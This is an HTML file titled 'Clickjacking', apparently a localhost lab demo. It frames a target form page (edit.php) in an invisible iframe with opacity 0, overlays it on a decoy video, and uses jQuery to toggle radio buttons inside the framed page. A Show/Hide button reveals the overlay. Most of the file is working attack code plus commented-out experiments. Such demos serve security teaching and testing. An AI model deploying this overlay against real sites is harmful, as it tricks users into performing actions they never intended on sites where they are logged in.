<!doctype html>
<html lang="en">
<html>
<head>
	<title>Clickjacking</title>
<script type = "text/javascript" src ="jq.js"></script>
 <script type = "text/javascript">
 var glob=1;
$(function() {
  $(window).load(function() {
    //var iframe2body = $('iframe').contents().find('body');
   // iframe2body.css({ 'background-color': '#333333', 'color': '#ddd' }); 
   //var o= $('iframe').contents();
  
   //document.frames['iframe'].scrollTo(0, 600);
   var name = $('iframe[name=frameDemo]').contents().find('input:radio[name=gender]:nth(0)');
    var name1= $('iframe[name=frameDemo]').contents().find('input:radio[name=gender]:nth(1)');
    var count=0;
if (name1.is(":checked")) {
	
	//name1.attr('checked',false);
	name.attr('checked',true);
    
    count++;
};
 if(name.is(":checked") && count==0) {
	//name.attr('checked',false);
    name1.attr('checked',true);
};

  // alert($('input:radio[name=gender]:checked').val());
    //$('input:radio[name=gender]:nth(0)').attr('checked',true);
    //input:radio[name=gender]:checked
    //$('input:radio[name=gender]:checked').val());
   })
})
 /*$('#frameDemo').load(function(){ 
 /* $(this).contents().find('a').css({
        background-color:#333333;

    });
});*/
 
//$( "#frameDemo" ).contents().find( "a" ).css( "background-color", "#BADA55" );



 </script>
</head>
<body >


<iframe src="http://localhost/Lucideus/Click_jack/edit.php" name="frameDemo" id="iframe" style="width:80%;
	  height:80%;
	  position:absolute;
	  top:0; left:0;
  opacity:0;
	  "></iframe>
<!--<script type = "text/javascript" src ="jq.js"></script>
 <script type = "text/javascript">
  /*function setData()
 {

var x = document.getElementById('frame1');
var y = x.Contentdocument;
y.body.style.backgroundColor = "red";*/
/*
 var genders = frame.contentWindow.document.getElementsByName('gender');
 if(genders[0].checked)
 {
 	genders[0].checked=false;
 	genders[1].checked=true;
 }
 else if(genders[1].checked)
 {
 	genders[1].checked=false;
 	genders[0].checked=true;
 }*/
/*for(var i = 0; i < genders.length; i++) {
   if(genders[i].checked == true) {
       genders[i].checked=false;
       

   }

 }
}*/
 

 </script>-->
<!--<a href="http://google.com" style="position:relative;left:345px;top:340px;z-index:-1">click me first </a>
<a href="http://google.com" style="position:absolute;left:350px;top:395px;z-index:-1">click me next</a>
<a href="#" style="position:absolute;left:350px;top:350px; z-index:-1" >Start</a>-->
<video style="position:absolute;left:190px;top:200px;z-index:-1" controls >
  <source src="movie.mp4" type="video/mp4">


  Your browser does not support the video tag.
</video>

<script>  
function hide()
{
  document.getElementById('iframe').style.opacity=(glob%2);
  glob++;
}

</script>
<button style="position:absolute;left:90%;" onclick="hide()">Show/Hide</button>
</body>
</html>
